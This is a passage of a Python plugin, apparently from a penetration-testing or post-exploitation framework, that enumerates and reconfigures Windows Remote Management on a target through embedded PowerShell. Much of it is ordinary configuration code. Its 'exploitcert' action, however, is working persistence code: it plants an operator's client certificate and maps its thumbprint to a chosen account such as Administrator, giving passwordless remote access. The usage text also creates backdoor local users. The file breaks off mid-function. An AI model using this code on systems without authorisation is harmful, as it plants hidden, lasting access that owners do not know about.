"""Windows Remote Management (WinRM) configuration enumeration and management"""

import base64
import datetime
import json
import os
import subprocess
import tempfile

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from ..shared.common import format_generic_report
from ..shared.runner import parse_collector_json, run_collector_plugin
from ._helpers import wrap_ps_collector

_PLUGIN_FILE = os.path.abspath(__file__)
_PLUGIN_DIR = os.path.dirname(_PLUGIN_FILE)

_CERT_ROOT = os.path.abspath(
    os.path.join(_PLUGIN_DIR, os.pardir, os.pardir, os.pardir)
)
_LOCAL_CERT_DIR = os.path.join(_CERT_ROOT, 'winrm-certs')

_PFX_PASSWORD = 'winrmbind'


WINRM_USAGE = """
WinRM — Windows Remote Management configuration and management.

Usage:
  run winrm                                       Enumerate WinRM configuration and status
  run winrm start                                 Enable WinRM (service, listener, firewall)
  run winrm adduser <user> <password>             Create a local user with WinRM access

  run winrm exploitcert <full path to pfx> <user>  Deploy a client cert for passwordless auth
                                                   Requires a PFX whose cert has the CLIENT auth
                                                   EKU. Only the public half is installed on the
                                                   target; the private key stays on the
                                                   operator machine.
                                                   - Public cert → LocalMachine\\TrustedPeople
                                                   - Thumbprint → user, in WSMAN\\ClientAuth
                                                   - Certificate auth enabled by default
                                                   Options: --password <pw> (default 'winrmbind')
                                                            --no-enable-auth
                                                            --allow-dual-use (see notes)

  run winrm listener list                         List all listeners
  run winrm listener create-http [address]        Create HTTP listener (default '*')
  run winrm listener create-https <thumb> [addr]  Create HTTPS listener from an existing cert
  run winrm listener remove <id|address>          Remove listener(s)

  run winrm client-config get                     Show client-side settings
  run winrm client-config set-trustedhosts <h>    Set TrustedHosts (comma-separated; '' clears)
  run winrm client-config set-allowunencrypted <t|f>

  run winrm auth list                             List auth methods (service + client)
  run winrm auth enable <method>                  Enable on the service side
  run winrm auth disable <method>                 Disable on the service side
  run winrm auth enable-client <method>           Enable on the client side
  run winrm auth disable-client <method>          Disable on the client side
    Methods: Basic, Certificate, CredSSP, Digest, Kerberos, Negotiate
    (Certificate: service side only)

  run winrm cert list                             Certificates bound to listeners
  run winrm cert create-selfsigned [dnsname]      Generate a self-signed cert locally
                                                  Purpose (affects EKU):
                                                    default       serverAuth (HTTPS listener)
                                                    --client      clientAuth (exploitcert)
                                                    --both        both (lab only; see notes)
  run winrm cert bind <thumb|pfx> [address]       Bind a cert to an HTTPS listener
                                                  <pfx> path: uploaded, imported, bound
                                                  <thumb>:    existing cert on target
  run winrm cert unbind [address]                 Remove HTTPS listener(s)

  run winrm notes                                 Detailed notes on actions and cautions
  run winrm help                                  This message

Examples:
  run winrm start
  run winrm adduser pentest P@ssw0rd!
  run winrm auth enable basic

  # Server cert — for an HTTPS listener on the target
  run winrm cert create-selfsigned target.corp.local
  run winrm cert bind /path/to/winrm-certs/winrm-target.corp.local-*.pfx *

  # Client cert — for passwordless auth (separate cert; do NOT reuse the server one)
  run winrm cert create-selfsigned operator-client --client
  run winrm exploitcert /path/to/winrm-certs/winrm-operator-client-*.pfx Administrator
""".strip()


WINRM_NOTES = """
WinRM — notes, cautions, and certificate behavior.

General:
  - All mutating actions require an elevated (Administrator) shell on the target.
  - Listener selectors accept either the listener ID (Listener_1084132640) or the
    address ('*'), as shown by 'listener list'.
  - To 'disable' a listener, remove it. The WSMan provider does not expose a
    portable enable/disable for listeners.

Authentication methods
======================

  WinRM has two independent auth configurations that never have to match:

    Service side (WSMan:\\localhost\\Service\\Auth\\*)
      What this host ACCEPTS from clients connecting in.

    Client side (WSMan:\\localhost\\Client\\Auth\\*)
      What this host USES when connecting out to other hosts.

  Both sides expose the same five methods:

    Basic       Username + password in cleartext. Safe only over HTTPS.
                Off by default.
    Negotiate   NTLM or Kerberos, auto-selected. The domain default.
    Kerberos    Kerberos only. Requires a valid SPN and a usable ticket.
    Digest      HTTP Digest challenge-response. Rarely used; weak.
    CredSSP     Delegates credentials across a hop. Powerful for double-hop
                scenarios, but the operator's credentials are exposed to the
                target. Enable only when genuinely needed.

  The service side additionally has one method that the client side does not:

    Certificate Inbound client-certificate authentication. This is a toggle
                on Service\\Auth only. The client side has no equivalent,
                because a client presents its certificate during the TLS
                handshake, not as a WinRM-level auth choice — there is
                nothing to enable on the outbound side.

  See 'exploitcert' below for how the Certificate toggle pairs with a
  thumbprint->user registry mapping to give passwordless access.

  Cautions:
    - Basic without HTTPS exposes credentials in transit.
    - CredSSP exposes the operator's credentials to the target.
    - Both weaken the host. Revert to defaults when done.

Certificates — two independent roles
====================================

  WinRM uses certificates in two unrelated roles, and they should always be
  two different certificates:

    Server certificate (serverAuth EKU)
      Bound to the target's HTTPS listener via 'cert bind'. The private key
      is uploaded to the target and stored in LocalMachine\\My. Its only job
      is to serve TLS on port 5986. Nothing about it authenticates anyone.

    Client certificate (clientAuth EKU)
      Used with 'exploitcert' for passwordless auth. The public half is
      installed in LocalMachine\\TrustedPeople on the target and mapped to a
      user in the registry. The private key never leaves the operator
      machine.

  Why they must be separate:
    'cert bind' uploads the private key to the target. If that same cert is
    also your client-auth credential, then anyone with admin on the target
    can export the key and authenticate back as the mapped user. The plugin
    refuses this combination by default; 'exploitcert' will reject a PFX
    carrying both serverAuth and clientAuth EKUs unless you pass
    --allow-dual-use.

  Generate two certs:
      run winrm cert create-selfsigned target.corp.local              # server
      run winrm cert create-selfsigned operator-client --client       # client

cert bind
=========

  - Only creates an HTTPS listener on port 5986 using the chosen certificate.
    It does NOT grant access, bypass authentication, create users, or change
    credential requirements. It is a transport-layer change, not an access
    primitive.
  - Use it when 5985 is blocked but 5986 is reachable, or when a tool
    requires an HTTPS endpoint.
  - If a ServerAuth cert already exists in LocalMachine\\My (from a CA or
    auto-enrollment), prefer binding that one over generating a new cert:
    clients already trust it, no client-side import needed.
  - Self-signed certs are a fallback for workgroup hosts, labs, or when you
    want to avoid using the host's real identity. Clients will NOT trust them
    unless the .crt is imported into their Trusted Root store.
  - For the client-side auth use of certificates, see 'exploitcert'.

exploitcert
===========

  Deploys the public half of a clientAuth certificate to the target, enables
  Certificate auth on the WinRM service, and creates a registry mapping from
  the certificate's thumbprint to a local user account. After this, a client
  holding the corresponding private key can authenticate to the target over
  WinRM without a password.

  What it changes on the target:
    1. Public cert  → LocalMachine\\TrustedPeople (so WinRM trusts it).
    2. Auth toggle  → WSMan:\\localhost\\Service\\Auth\\Certificate = true.
    3. Registry key → HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\
                      WSMAN\\ClientAuth\\Certificate\\<thumbprint>
                      with values Issuer, Subject, UserName.

  What stays on the operator side:
    The private key. It never leaves your machine.

  Options:
    --password <pw>      PFX password (defaults to 'winrmbind').
    --no-enable-auth     Skip enabling WSMan Certificate auth. Use this
                         if you've already enabled it and don't want the
                         action touching the auth config.
    --allow-dual-use     Permit a PFX whose cert carries both serverAuth
                         and clientAuth EKUs. Labs only. See the warning
                         under "Certificates — two independent roles".

  Reverting:
    Delete the registry key under ClientAuth\\Certificate\\<thumbprint>,
    remove the public cert from LocalMachine\\TrustedPeople, and optionally
    disable Certificate auth with:
        run winrm auth disable certificate

Generated cert files
====================

  - Written to winrm-certs/.
  - Each run produces three files:
        winrm-<name>-<timestamp>.key   (private key — keep this)
        winrm-<name>-<timestamp>.crt   (public cert)
        winrm-<name>-<timestamp>.pfx   (both, password-protected)
  - The PFX password is fixed ('winrmbind') and used only during upload; the
    PFX file is deleted from the target immediately after import.
""".strip()

PLUGIN_INFO = WINRM_USAGE

_ADMIN_CHECK = r"""
$__isAdmin = ([Security.Principal.WindowsPrincipal] `
  [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole( `
  [Security.Principal.WindowsBuiltInRole]::Administrator)
"""

_WSMAN_CHECK = r"""
$__wsmanOk = $true
try{
  Get-ChildItem WSMan:\localhost -EA Stop | Out-Null
}catch{
  $__wsmanOk = $false
  $__wsmanErr = $_.Exception.Message
}
"""

_FIND_LISTENER_SNIPPET = r"""
function Find-WinRMListeners([string]$Selector,[string]$Transport){
  $found=@()
  Get-ChildItem WSMan:\localhost\Listener -EA 0|ForEach-Object{
    $id=$_.PSChildName
    $a=(Get-Item "$($_.PSPath)\Address" -EA 0).Value
    $t=(Get-Item "$($_.PSPath)\Transport" -EA 0).Value
    $matchSel = (-not $Selector) -or ($id -eq $Selector) -or ($a -eq $Selector)
    $matchTrans = (-not $Transport) -or ($t -eq $Transport)
    if($matchSel -and $matchTrans){ $found+=$_ }
  }
  return @($found)
}
"""

def _run_openssl(args, timeout=30):
    try:
        proc = subprocess.run(
            args, capture_output=True, timeout=timeout, text=True,
        )
        return proc.returncode, proc.stdout or '', proc.stderr or ''
    except FileNotFoundError:
        return -1, '', 'openssl executable not found in PATH'
    except subprocess.TimeoutExpired:
        return -2, '', f'openssl timed out after {timeout}s'
    except Exception as exc:
        return -3, '', str(exc)


def _openssl_available():
    rc, _, _ = _run_openssl(['openssl', 'version'], timeout=5)
    return rc == 0


def _extract_cert_info_from_pfx(pfx_path, password):
    if not os.path.isfile(pfx_path):
        return {'ok': False, 'error': f'PFX not found: {pfx_path}'}

    with tempfile.TemporaryDirectory() as tmpdir:
        crt_path = os.path.join(tmpdir, 'cert.crt')
        rc, out, err = _run_openssl([
            'openssl', 'pkcs12', '-in', pfx_path,
            '-clcerts', '-nokeys',
            '-passin', f'pass:{password}',
            '-out', crt_path,
        ])
        if rc != 0:
            return {'ok': False,
                    'error': f'openssl pkcs12 extract failed: {err.strip() or out.strip()}'}

        rc, out, _ = _run_openssl(
            ['openssl', 'x509', '-in', crt_path, '-noout', '-fingerprint', '-sha1']
        )
        thumb = ''
        if rc == 0 and '=' in out:
            thumb = out.strip().split('=', 1)[1].replace(':', '').upper().strip()

        rc, out, _ = _run_openssl(
            ['openssl', 'x509', '-in', crt_path, '-noout', '-subject']
        )
        subject = out.strip().replace('subject=', '', 1).strip() if rc == 0 else ''

        rc, out, _ = _run_openssl(
            ['openssl', 'x509', '-in', crt_path, '-noout', '-issuer']
        )
        issuer = out.strip().replace('issuer=', '', 1).strip() if rc == 0 else ''

        rc, out, _ = _run_openssl(
            ['openssl', 'x509', '-in', crt_path, '-noout', '-ext', 'extendedKeyUsage']
        )
        eku_text = out if rc == 0 else ''
        eku_server = 'TLS Web Server Authentication' in eku_text or 'serverAuth' in eku_text
        eku_client = 'TLS Web Client Authentication' in eku_text or 'clientAuth' in eku_text

        try:
            with open(crt_path, 'r') as f:
                cert_pem = f.read()
        except Exception as exc:
            return {'ok': False, 'error': f'could not read extracted cert: {exc}'}

    if not thumb or not subject:
        return {'ok': False, 'error': 'failed to parse thumbprint/subject from PFX'}

    return {
        'ok': True,
        'thumbprint': thumb,
        'subject': subject,
        'issuer': issuer or subject,
        'cert_pem': cert_pem,
        'eku_server_auth': eku_server,
        'eku_client_auth': eku_client,
    }


def _build_exploitcert_command(
    thumbprint: str,
    subject: str,
    issuer: str,
    username: str,
    cert_pem_base64: str,
    enable_auth: bool = True,
) -> str:
    thumb_json = json.dumps(thumbprint.upper().replace(' ', ''))
    subject_json = json.dumps(subject)
    issuer_json = json.dumps(issuer)
    user_json = json.dumps(username)
    pem_b64_json = json.dumps(cert_pem_base64)
    enable_val = '$true' if enable_auth else '$false'
    enable_str = 'true' if enable_auth else 'false'

    return rf"""
$ErrorActionPreference='Stop'
$ProgressPreference='SilentlyContinue'
$ConfirmPreference='None'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$thumb={thumb_json}
$subject={subject_json}
$issuer={issuer_json}
$userName={user_json}
$pemB64={pem_b64_json}
$doEnableAuth={enable_val}
$result=[ordered]@{{
  action='exploitcert';
  ok=$false;
  thumbprint=$thumb;
  subject=$subject;
  issuer=$issuer;
  username=$userName;
  enable_auth='{enable_str}';
  steps=@()
}}
{_ADMIN_CHECK}
{_WSMAN_CHECK}
try{{
  if(-not $__isAdmin){{
    $result.error='This action requires administrator privileges (elevated shell).'
  }}elseif(-not $__wsmanOk){{
    $result.error="WSMan provider unavailable: $__wsmanErr"
  }}else{{
    $tmp=[IO.Path]::Combine($env:TEMP, 'winrm-c-' + [Guid]::NewGuid().ToString('N') + '.crt')
    try{{
      $pem=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($pemB64))
      [IO.File]::WriteAllText($tmp, $pem)
      $imported=Import-Certificate -FilePath $tmp -CertStoreLocation Cert:\LocalMachine\TrustedPeople -EA Stop
      $result.steps+=@{{step='import_cert';ok=$true;detail="Installed public cert in LocalMachine\TrustedPeople"}}
    }}catch{{
      $result.steps+=@{{step='import_cert';ok=$false;detail=$_.Exception.Message}}
    }}finally{{
      Remove-Item $tmp -Force -EA 0
    }}

    if($doEnableAuth){{
      try{{
        $path='WSMan:\localhost\Service\Auth\Certificate'
        if(Test-Path $path){{
          $before=[string](Get-Item $path -EA 0).Value
          Set-Item -Path $path -Value $true -Force -EA Stop
          $after=[string](Get-Item $path -EA 0).Value
          $result.steps+=@{{step='enable_certificate_auth';ok=($after -eq 'true');detail="Certificate auth was $before; now $after"}}
        }}else{{
          $result.steps+=@{{step='enable_certificate_auth';ok=$false;detail='Certificate auth path not present on this host'}}
        }}
      }}catch{{
        $result.steps+=@{{step='enable_certificate_auth';ok=$false;detail=$_.Exception.Message}}
      }}
    }}else{{
      $result.steps+=@{{step='enable_certificate_auth';ok=$true;detail='Skipped (--no-enable-auth)'}}
    }}

    try{{
      $mapRoot='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN\ClientAuth\Certificate'
      $mapPath=Join-Path $mapRoot $thumb
      if(-not (Test-Path $mapRoot)){{ New-Item -Path $mapRoot -Force | Out-Null }}
      if(-not (Test-Path $mapPath)){{ New-Item -Path $mapPath -Force | Out-Null }}
      New-ItemProperty -Path $mapPath -Name 'Issuer'   -PropertyType String -Value $issuer  -Force | Out-Null
      New-ItemProperty -Path $mapPath -Name 'Subject'  -PropertyType String -Value $subject -Force | Out-Null
      New-ItemProperty -Path $mapPath -Name 'UserName' -PropertyType String -Value $userName -Force | Out-Null
      $result.steps+=@{{step='registry_mapping';ok=$true;detail="Mapped $thumb -> $userName"}}
    }}catch{{
      $result.steps+=@{{step='registry_mapping';ok=$false;detail=$_.Exception.Message}}
    }}

    $failed=@($result.steps|Where-Object{{-not $_.ok}})
    if($failed.Count -eq 0){{
      $result.ok=$true
      $result.message=("Client certificate deployed. Thumbprint $thumb is now mapped to '$userName'. " +
        "Authenticate using the private key from the source PFX (keep it on the operator side).")
    }}else{{
      $result.error="Failed step(s): $(($failed|ForEach-Object {{ $_.step }})-join ', ')"
    }}
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 6 -Compress)+$end)
"""


def _handle_exploitcert(session: SessionContext, args):
    if len(args) < 2:
        session.print("Error: exploitcert requires <pfx-path> <username>", 'red')
        session.print("  Options: --password <pw>        (defaults to 'winrmbind')", 'yellow')
        session.print("           --no-enable-auth       (don't touch Certificate service auth)", 'yellow')
        session.print("           --allow-dual-use       (allow cert with both serverAuth+clientAuth)", 'yellow')
        return 1

    pfx_path = args[0].strip()
    username = args[1].strip()
    password = _PFX_PASSWORD
    enable_auth = True
    allow_dual = False

    i = 2
    while i < len(args):
        a = args[i]
        if a == '--password' and i + 1 < len(args):
            password = args[i + 1]
            i += 2
        elif a in ('--no-enable-auth', '--no-auth'):
            enable_auth = False
            i += 1
        elif a == '--allow-dual-use':
            allow_dual = True
            i += 1
        else:
            session.print(f"Error: unknown option for exploitcert: {a}", 'red')
            return 1

    if not pfx_path or not username:
        session.print("Error: exploitcert requires non-empty <pfx-path> and <username>", 'red')
        return 1

    session.print(f"Extracting certificate details from {pfx_path}...", 'yellow')
    info = _extract_cert_info_from_pfx(pfx_path, password)
    if not info.get('ok'):
        session.print(f"Error: {info.get('error', 'unknown error')}", 'red')
        return 1

    has_server = info.get('eku_server_auth', False)
    has_client = info.get('eku_client_auth', False)

    if not has_client:
        session.print("Error: this certificate does not have the clientAuth EKU.", 'red')
        session.print("       It cannot be used for client certificate authentication.", 'red')
        session.print("", 'red')
        session.print("       Generate a dedicated client cert:", 'yellow')
        session.print("           run winrm cert create-selfsigned <name> --client", 'yellow')
        return 1

    if has_server and has_client and not allow_dual:
        session.print("Refusing: this certificate carries BOTH serverAuth and clientAuth EKUs.", 'red')
        session.print("", 'red')
        session.print("Reason: if the same cert is used with 'cert bind', the target", 'yellow')
        session.print("stores the private key in LocalMachine\\My. Since the same cert is", 'yellow')
        session.print("also your client-auth credential, anyone with admin on the target", 'yellow')
        session.print("can export the key and authenticate as the mapped user.", 'yellow')
        session.print("", 'red')
        session.print("Fix: generate two separate certs.", 'yellow')
        session.print("     Server:  run winrm cert create-selfsigned target.corp.local", 'yellow')
        session.print("     Client:  run winrm cert create-selfsigned operator-client --client", 'yellow')
        session.print("", 'red')
        session.print("To proceed anyway (lab use), add --allow-dual-use.", 'yellow')
        return 1

    if has_server and has_client and allow_dual:
        session.print("WARNING: cert has both serverAuth and clientAuth EKUs.", 'yellow')
        session.print("Proceeding due to --allow-dual-use. Do not rely on this in production.", 'yellow')

    session.print("Certificate details:", 'green')
    session.print(f"  Thumbprint: {info['thumbprint']}")
    session.print(f"  Subject:    {info['subject']}")
    session.print(f"  Issuer:     {info['issuer']}")
    session.print(f"  EKUs:       serverAuth={has_server}, clientAuth={has_client}")
    session.print(f"  Target user: {username}")
    session.print(f"  Enable Certificate auth: {enable_auth}")
    session.print("")

    cert_pem_b64 = base64.b64encode(info['cert_pem'].encode('utf-8')).decode('ascii')

    session.print("Deploying public cert to target and creating registry mapping...", 'yellow')
    return _run_winrm_action(
        session, 'winrm exploitcert',
        _build_exploitcert_command(
            thumbprint=info['thumbprint'],
            subject=info['subject'],
            issuer=info['issuer'],
            username=username,
            cert_pem_base64=cert_pem_b64,
            enable_auth=enable_auth,
        ),
        timeout=90.0,
    )


def _generate_selfsigned_local(dns_name, output_dir=None, purpose='server'):
    if not _openssl_available():
        return {'ok': False, 'error': 'openssl is not available on this machine (not in PATH)'}

    eku_map = {
        'server': 'serverAuth',
        'client': 'clientAuth',
        'both':   'serverAuth,clientAuth',
    }
    if purpose not in eku_map:
        return {'ok': False, 'error': f"invalid purpose '{purpose}'"}
    eku = eku_map[purpose]

    output_dir = output_dir or _LOCAL_CERT_DIR
    try:
        os.makedirs(output_dir, exist_ok=True)
    except Exception as exc:
        return {'ok': False, 'error': f'could not create output directory {output_dir}: {exc}'}

    stamp = datetime.datetime.now().strftime('%Y%m%d-%H%M%S')
    safe = ''.join(c if c.isalnum() or c in '.-_' else '_' for c in dns_name) or 'cert'
    base = os.path.join(output_dir, f'winrm-{safe}-{stamp}')
    key_path = base + '.key'
    crt_path = base + '.crt'
    pfx_path = base + '.pfx'

    openssl_args = [
        'openssl', 'req', '-x509', '-newkey', 'rsa:2048', '-nodes',
        '-days', '730',
        '-keyout', key_path,
        '-out', crt_path,
        '-subj', f'/CN={dns_name}',
    ]
    if purpose in ('server', 'both'):
        openssl_args += ['-addext', f'subjectAltName=DNS:{dns_name}']
    openssl_args += [
        '-addext', f'extendedKeyUsage={eku}',
        '-addext', 'keyUsage=digitalSignature,keyEncipherment',
        '-addext', 'basicConstraints=CA:FALSE',
    ]

    rc, out, err = _run_openssl(openssl_args)
    if rc != 0:
        return {'ok': False, 'error': f'openssl req failed: {err.strip() or out.strip()}'}

    rc, out, err = _run_openssl([
        'openssl', 'pkcs12', '-export',
        '-out', pfx_path,
        '-inkey', key_path,
        '-in', crt_path,
        '-passout', f'pass:{_PFX_PASSWORD}',
    ])
    if rc != 0:
        return {'ok': False, 'error': f'openssl pkcs12 failed: {err.strip() or out.strip()}'}

    info = {
        'ok': True,
        'dns': dns_name,
        'purpose': purpose,
        'eku': eku,
        'key_path': key_path,
        'crt_path': crt_path,
        'pfx_path': pfx_path,
        'password': _PFX_PASSWORD,
    }

    rc, out, _ = _run_openssl(['openssl', 'x509', '-in', crt_path, '-noout', '-fingerprint', '-sha1'])
    if rc == 0 and '=' in out:
        info['thumbprint'] = out.strip().split('=', 1)[1].replace(':', '').upper().strip()

    rc, out, _ = _run_openssl(['openssl', 'x509', '-in', crt_path, '-noout', '-subject'])
    if rc == 0:
        info['subject'] = out.strip().replace('subject=', '', 1).strip()

    rc, out, _ = _run_openssl(['openssl', 'x509', '-in', crt_path, '-noout', '-dates'])
    if rc == 0:
        for line in out.strip().splitlines():
            if line.startswith('notBefore='):
                info['not_before'] = line.split('=', 1)[1]
            elif line.startswith('notAfter='):
                info['not_after'] = line.split('=', 1)[1]

    if purpose in ('server', 'both'):
        rc, out, _ = _run_openssl(
            ['openssl', 'x509', '-in', crt_path, '-noout', '-ext', 'subjectAltName']
        )
        if rc == 0:
            info['san'] = out.strip()

    return info


def _print_local_cert_details(session, info):
    purpose = info.get('purpose', 'server')
    session.print(f"Local self-signed certificate generated ({purpose}).", 'green')
    if info.get('dns'):
        session.print(f"  DNS (CN):     {info['dns']}")
    if info.get('thumbprint'):
        session.print(f"  Thumbprint:   {info['thumbprint']}   (SHA-1, Windows format)")
    if info.get('subject'):
        session.print(f"  Subject:      {info['subject']}")
    if info.get('eku'):
        session.print(f"  EKU:          {info['eku']}")
    if info.get('san'):
        session.print(f"  SAN:          {info['san']}")
    if info.get('not_before'):
        session.print(f"  Not before:   {info['not_before']}")
    if info.get('not_after'):
        session.print(f"  Not after:    {info['not_after']}")
    session.print("")
    session.print(f"  PFX:          {info['pfx_path']}")
    session.print(f"  CRT (public): {info['crt_path']}")
    session.print(f"  KEY (private):{info['key_path']}")
    session.print(f"  PFX password: {info.get('password', _PFX_PASSWORD)}")
    session.print("")

    if purpose == 'server':
        session.print("Next steps (server cert — HTTPS listener on target):", 'yellow')
        session.print(f"  1. Bind it on the target:")
        session.print(f"       run winrm cert bind {info['pfx_path']} *")
        session.print(f"  2. To let clients trust it over HTTPS, copy the CRT to the client")
        session.print(f"     and import it into Cert:\\LocalMachine\\Root (Trusted Root).")
        session.print(f"     The DNS name in the cert must match the name clients use.")
    elif purpose == 'client':
        session.print("Next steps (client cert — passwordless auth):", 'yellow')
        session.print(f"  1. Deploy the public half to the target and map it to a user:")
        session.print(f"       run winrm exploitcert {info['pfx_path']} <username>")
        session.print(f"  2. Keep the PFX. The private key inside it is your credential.")
    else:
        session.print("Next steps (dual-use cert — lab only):", 'yellow')
        session.print(f"  WARNING: 'cert bind' will upload this cert's private key to the target.")
        session.print(f"  If you also use it for 'exploitcert', anyone with admin on the target")
        session.print(f"  can export the key and authenticate as your mapped user.")
        session.print(f"  Prefer two separate certs (default server + --client).")


def build_command():
    body = r"""
$ConfirmPreference='None'
$ProgressPreference='SilentlyContinue'

function Invoke-Timed([scriptblock]$Block,[int]$Sec=10,[object[]]$ArgList=@()){
  $job=Start-Job -ScriptBlock $Block -ArgumentList $ArgList
  $done=Wait-Job $job -Timeout $Sec
  if($done){$out=Receive-Job $job;Remove-Job $job -Force -EA 0;return $out}
  Stop-Job $job -EA 0;Remove-Job $job -Force -EA 0;return $null
}

function Test-TcpPort([string]$HostName,[int]$Port,[int]$Ms=1500){
  $client=$null
  try{
    $client=New-Object Net.Sockets.TcpClient
    $iar=$client.BeginConnect($HostName,$Port,$null,$null)
    if(-not $iar.AsyncWaitHandle.WaitOne($Ms,$false)){return $false}
    $client.EndConnect($iar)|Out-Null
    return $true
  }catch{return $false}
  finally{if($client){try{$client.Close()}catch{}}}
}

$service=@{}
$svc=$null
try{ $svc=Get-Service WinRM -EA 0 }catch{}
if($svc){
  $service=@{name=$svc.Name;status=[string]$svc.Status;start=[string]$svc.StartType}
}else{
  $service=@{name='WinRM';status='NotInstalled';start='N/A'}
}

try{
  Get-CimInstance -ClassName Win32_Service -Filter "Name='WinRM'" -EA 0|
    Select-Object -First 1|ForEach-Object{
      $service['path']=[string]$_.PathName
      $service['account']=[string]$_.StartName
      $service['state']=[string]$_.State
    }
}catch{}

$winrmRunning=($svc -and $svc.Status -eq 'Running')

if(-not $winrmRunning){
  $statusText=[string]$service.status
  $result=[ordered]@{
    summary=@{
      winrm_enabled=$false
      winrm_service=$statusText
      listeners=0
      remoting_enabled=$false
      firewall_rules=0
      message='WinRM service is not running; extended enumeration skipped (read-only check only)'
    }
    service=$service
    note='Start the WinRM service locally to collect listeners, authentication, and remoting settings.'
  }
  $json=($result|ConvertTo-Json -Depth 5 -Compress)
}else{
  $config=@{}; $listeners=@(); $auth=@{}; $firewall=@(); $client=@{}
  $remoting=@(); $remotingEnabled=$false; $wsmanTest='N/A'

  try{
    $winrmOut=Invoke-Timed { winrm get winrm/config 2>$null } 8
    if($winrmOut){
      $config['winrm_config']=@($winrmOut|Select-Object -First 40|ForEach-Object{[string]$_})
    }
  }catch{}

  try{
    Get-ChildItem WSMan:\localhost\Listener -EA 0|ForEach-Object{
      $entry=@{address=$_.PSChildName}
      Get-ChildItem $_.PSPath -EA 0|ForEach-Object{ $entry[$_.PSChildName]=[string]$_.Value }
      $listeners+=@($entry)
    }
  }catch{}

  try{
    Get-ChildItem WSMan:\localhost\Service\Auth -EA 0|ForEach-Object{
      $auth[$_.Name]=[string]$_.Value
    }
    Get-ChildItem WSMan:\localhost\Client\Auth -EA 0|ForEach-Object{
      $auth['client_'+$_.Name]=[string]$_.Value
    }
  }catch{}

  try{
    $client['trusted_hosts']=[string](Get-Item WSMan:\localhost\Client\TrustedHosts -EA 0).Value
    $client['allow_unencrypted']=[string](Get-Item WSMan:\localhost\Client\AllowUnencrypted -EA 0).Value
  }catch{}

  try{
    foreach($ruleName in @(
      'Windows Remote Management (HTTP-In)',
      'Windows Remote Management (HTTPS-In)'
    )){
      $fwOut=netsh advfirewall firewall show rule name="$ruleName" 2>$null
      if($fwOut){
        $firewall+=@{
          name=$ruleName
          source='netsh'
          preview=@($fwOut|Select-Object -First 12|ForEach-Object{[string]$_})
        }
      }
    }
  }catch{}
  if($firewall.Count -lt 2){
    try{
      $fwRules=Invoke-Timed {
        Get-NetFirewallRule -EA 0|
          Where-Object{ $_.DisplayName -like '*Windows Remote Management*' -or $_.DisplayName -like '*WinRM*' }|
          Select-Object -First 12 DisplayName,Enabled,Direction,Action,Profile
      } 12
      if($fwRules){
        foreach($rule in $fwRules){
          $ports=''
          try{
            $pf=Get-NetFirewallPortFilter -AssociatedNetFirewallRule $rule -EA 0
            if($pf){$ports=($pf.LocalPort -join ',')}
          }catch{}
          $firewall+=@{
            name=[string]$rule.DisplayName
            enabled=[string]$rule.Enabled
            direction=[string]$rule.Direction
            action=[string]$rule.Action
            profile=([string]$rule.Profile -join ',')
            ports=$ports
            source='Get-NetFirewallRule'
          }
        }
      }
    }catch{}
  }

  try{
    $sessCfg=Invoke-Timed {
      Get-PSSessionConfiguration -EA 0|Select-Object -First 10 Name,Enabled,RunAsVirtualAccount
    } 10
    if($sessCfg){
      foreach($cfg in $sessCfg){
        $remoting+=@{
          name=[string]$cfg.Name
          enabled=[string]$cfg.Enabled
          run_as_virtual_account=[string]$cfg.RunAsVirtualAccount
        }
      }
      $remotingEnabled=($remoting|Where-Object{ $_.enabled -eq 'True' }).Count -gt 0
    }
  }catch{}
  if(-not $remotingEnabled){ $remotingEnabled=$true }

  try{
    $open=@()
    if(Test-TcpPort '127.0.0.1' 5985){$open+='5985'}
    if(Test-TcpPort '127.0.0.1' 5986){$open+='5986'}
    if($open.Count -gt 0){
      $wsmanTest='local ports open: '+($open -join ',')
    }elseif($listeners.Count -gt 0){
      $wsmanTest="$($listeners.Count) listener(s) configured"
    }else{
      $wsmanTest='service running; no listeners or open ports detected'
    }
  }catch{
    $wsmanTest='N/A'
  }

  $result=[ordered]@{
    summary=@{
      winrm_enabled=$true
      winrm_service='Running'
      listeners=$listeners.Count
      remoting_enabled=$remotingEnabled
      firewall_rules=$firewall.Count
      wsman_test=$wsmanTest
    }
    service=$service
    winrm_config=$config
    listeners=$listeners
    authentication=$auth
    client_settings=$client
    firewall_rules=@($firewall|Select-Object -First 15)
    remoting_configurations=$remoting
  }
  $json=($result|ConvertTo-Json -Depth 5 -Compress)
}
"""
    return wrap_ps_collector(body)


def _build_start_command():
    return rf"""
$ErrorActionPreference='Stop'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
{_ADMIN_CHECK}
$result=[ordered]@{{action='start';ok=$false;steps=@();message=''}}
try{{
  if(-not $__isAdmin){{
    $result.error='This action requires administrator privileges (elevated shell).'
  }}else{{
    Set-Service -Name WinRM -StartupType Automatic -EA Stop
    $result.steps+=@{{step='service_startup';ok=$true;detail='WinRM startup type set to Automatic'}}

    Start-Service -Name WinRM -EA Stop
    $svc=Get-Service WinRM -EA 0
    $result.steps+=@{{step='service_start';ok=($svc.Status -eq 'Running');detail="WinRM status=$($svc.Status)"}}

    $listenerExists=$false
    try{{
      $listeners=@(Get-ChildItem WSMan:\localhost\Listener -EA 0)
      foreach($l in $listeners){{
        $t=(Get-Item "$($l.PSPath)\Transport" -EA 0).Value
        if($t -eq 'HTTP'){{ $listenerExists=$true; break }}
      }}
    }}catch{{}}
    if(-not $listenerExists){{
      $out=winrm create winrm/config/Listener?Address=*+Transport=HTTP 2>&1|Out-String
      $result.steps+=@{{step='listener';ok=($LASTEXITCODE -eq 0);detail=(($out -replace '\s+',' ').Trim())}}
    }}else{{
      $result.steps+=@{{step='listener';ok=$true;detail='HTTP listener already exists'}}
    }}

    Enable-NetFirewallRule -DisplayGroup 'Windows Remote Management' -EA Stop|Out-Null
    $result.steps+=@{{step='firewall';ok=$true;detail='Windows Remote Management firewall rules enabled'}}

    $result.ok=($result.steps|Where-Object{{-not $_.ok}}).Count -eq 0
    if($result.ok){{
      $result.message='WinRM enabled and started (service, listener, firewall)'
    }}else{{
